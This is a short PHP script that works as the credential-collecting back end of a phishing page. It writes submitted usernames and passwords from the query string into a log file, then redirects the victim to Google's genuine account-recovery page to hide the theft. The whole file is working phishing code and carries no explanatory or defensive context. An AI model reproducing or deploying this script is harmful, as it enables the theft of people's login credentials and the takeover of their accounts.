<?php

file_put_contents("log.txt", "Username: " . $_GET['username'] . " Pass: " . $_GET['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
